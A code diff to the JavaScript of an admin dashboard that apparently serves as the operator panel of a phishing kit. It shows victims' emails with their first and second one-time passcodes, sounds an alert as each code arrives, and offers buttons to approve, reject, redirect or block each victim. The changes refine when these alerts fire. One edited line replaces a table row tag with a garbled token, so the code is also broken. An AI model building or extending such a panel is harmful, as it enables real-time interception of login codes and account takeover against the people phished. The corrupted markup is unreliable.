@@ -586,7 +586,7 @@
 const token = localStorage.getItem('adminToken');
 if (!token) window.location.href = '/admin/login';
 
-// ==================== MP3 AUDIO ALERTS - AUTOMATIC ====================
+// ==================== MP3 AUDIO ALERTS - ONLY FOR INCOMING EVENTS ====================
 let soundEnabled = true;
 let isAudioReady = false;
 let audioContextInitialized = false;
@@ -599,7 +599,7 @@ otpSound.preload = 'auto';
 signupSound.volume = 0.8;
 otpSound.volume = 0.8;
 
-// Initialize audio automatically
+// Initialize audio automatically on page load
 function initAudio() {
     if (audioContextInitialized) return;
     
@@ -752,18 +752,21 @@ function closeModal() {
     document.getElementById('userModal').style.display = 'none'; 
 }
 
-// ==================== TRACK PREVIOUS STATE FOR ALERTS ====================
+// ==================== TRACK PREVIOUS STATE FOR INCOMING EVENTS ONLY ====================
 let previousUserMap = new Map();
 let isFirstLoad = true;
 
 function checkForNewEvents(users) {
     if (isFirstLoad) {
+        // Store initial state without alerts
         users.forEach(user => {
             previousUserMap.set(user.email, {
                 approved: user.approved,
                 otp: user.otp,
                 second_otp: user.second_otp,
-                otp1_never: user.otp1_never
+                otp1_never: user.otp1_never,
+                otp1_correct: user.otp1_correct,
+                otp2_correct: user.otp2_correct
             });
         });
         isFirstLoad = false;
@@ -774,6 +777,7 @@ function checkForNewEvents(users) {
         const previous = previousUserMap.get(user.email);
         
         if (!previous) {
+            // NEW USER SIGNUP - Play sound and show alert (INCOMING EVENT)
             if (!user.otp1_never) {
                 playSound('signup');
                 showToast('New Signup', `${user.email} signed up`);
@@ -782,7 +786,8 @@ function checkForNewEvents(users) {
                 setTimeout(() => card.classList.remove('has-new'), 3000);
             }
         } else {
-            if (!previous.otp && user.otp && !user.otp1_never) {
+            // Check for NEW FIRST OTP submission (INCOMING EVENT)
+            if (!previous.otp && user.otp && !user.otp1_never && !user.otp1_correct) {
                 playSound('otp');
                 showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
                 const card = document.getElementById('pendingFirstCard');
@@ -790,27 +795,28 @@ function checkForNewEvents(users) {
                 setTimeout(() => card.classList.remove('has-new'), 3000);
             }
             
-            if (!previous.second_otp && user.second_otp && !user.otp1_never) {
+            // Check for NEW SECOND OTP submission (INCOMING EVENT)
+            if (!previous.second_otp && user.second_otp && !user.otp1_never && !user.otp2_correct) {
                 playSound('otp');
                 showToast('Second OTP', `${user.email} submitted second OTP`);
                 const card = document.getElementById('pendingSecondCard');
                 card.classList.add('has-new');
                 setTimeout(() => card.classList.remove('has-new'), 3000);
             }
-            
-            if (!previous.otp1_never && user.otp1_never) {
-                showToast('User Blocked', `${user.email} has been blocked`);
-            }
         }
         
+        // Update previous state
         previousUserMap.set(user.email, {
             approved: user.approved,
             otp: user.otp,
             second_otp: user.second_otp,
-            otp1_never: user.otp1_never
+            otp1_never: user.otp1_never,
+            otp1_correct: user.otp1_correct,
+            otp2_correct: user.otp2_correct
         });
     });
     
+    // Clean up deleted users
     for (let [email, prev] of previousUserMap.entries()) {
         const stillExists = users.find(u => u.email === email);
         if (!stillExists && !isFirstLoad) {
@@ -905,7 +911,7 @@ function displayUsers(users) {
         
         actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
         
-        return `<tr>
+        return `｜｜DSML｜｜
             <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
             <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
             <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
@@ -916,7 +922,7 @@ function displayUsers(users) {
     }).join('');
 }
 
-// ==================== API CALLS FOR ACTIONS ====================
+// ==================== API CALLS FOR ADMIN ACTIONS (NO SOUNDS) ====================
 async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     try {
         const response = await fetch(endpoint, { 
@@ -928,6 +934,7 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
         if (data.success) { 
             showToast('Success', successMsg); 
             fetchUsers(); 
+            // ❌ NO playSound() here - admin actions should NOT trigger sounds
         } else { 
             showToast('Error', data.detail || errorMsg); 
         }
@@ -936,12 +943,10 @@ async function apiCall(endpoint, method, email, successMsg, errorMsg) {
     }
 }
 
-// Admin action functions
+// Admin action functions - NO SOUNDS
 function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
 function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
-function successFirstOTP(email) { 
-    apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); 
-}
+function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
 function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
 function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
 function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
